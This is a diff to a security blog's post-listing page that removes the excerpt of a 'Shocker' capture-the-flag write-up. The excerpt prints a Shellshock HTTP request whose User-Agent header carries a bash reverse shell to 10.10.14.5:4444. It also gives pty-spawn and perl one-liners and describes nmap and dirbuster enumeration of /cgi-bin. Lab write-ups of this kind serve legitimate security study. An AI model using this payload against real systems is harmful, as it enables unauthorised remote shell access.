@@ -145,18 +145,6 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2>Shocker Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p># Shocker GET /cgi-bin/user.sh HTTP/1.1 Host: 10.10.10.56 User-Agent: () { :; }; echo; echo; /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1&#39; Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; - ``` perl -e &#39;exec &#34;cat /root&#34;;&#39; ``` Solving start off by doing an nmap scan after doing the nmap scan you should notice there are two ports that are shown to be opened the first port is 80, and the second is 2222 port 80 is http, and is likely hosting a web page port 2222 is hosting ssh which is uncommon after visting the web page, I see that there isnt much on it I will now use dirbuster ( a tool used to bruteforce directories using a wordlist ) after using dirbuster I see that there is a directory for /cgi-bin CGI = (commen gateway interface) This file path is used to host scripts that use enviorment varibles that interact with the web browser after visting the page I can see I get a error 403 which means this page exists but is forbidden I can use dirbuster agian to scan the directories inside ofthe directory /cgi-bin/ in dirbuster I can specify that I want to look for a specific file type in this case I am going to search for script file extensions (example: sh, py, php etc…) after doing this I have found a user....</p>
-  </div>
-  <footer class="entry-footer"><span title='2019-03-11 00:00:00 +0000 UTC'>March 11, 2019</span></footer>
-  <a class="entry-link" aria-label="post link to Shocker Writeup" href="https://master.d399a8x098uivu.amplifyapp.com/posts/shocker-writeup/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
     <h2>Simple Kernel Driver
     </h2>
   </header>
